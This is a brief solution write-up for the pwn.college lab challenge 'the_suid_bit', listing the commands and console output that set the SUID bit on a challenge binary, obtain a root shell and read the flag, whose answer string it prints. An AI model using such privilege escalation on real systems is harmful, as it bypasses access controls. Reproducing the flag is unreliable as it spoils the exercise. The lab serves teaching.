# CTF Challenge: the_suid_bit

## Table of Content

- commands-executed: chmod u+s /challenge/getroot , /challenge/getroot , cat /flag
- flag :pwn.college{0IcOPZO7fK7tRVPrbzAXuymuy_d.dNTM2QDLzETN0czW}


### Output:
```console
hacker@permissions~the-suid-bit:~$ chmod u+s /challenge/getroot 
hacker@permissions~the-suid-bit:~$ /challenge/getroot 
SUCCESS! You have set the suid bit on this program, and it is running as root! 
Here is your shell...
root@permissions~the-suid-bit:~# cat /flag
pwn.college{0IcOPZO7fK7tRVPrbzAXuymuy_d.dNTM2QDLzETN0czW}
```
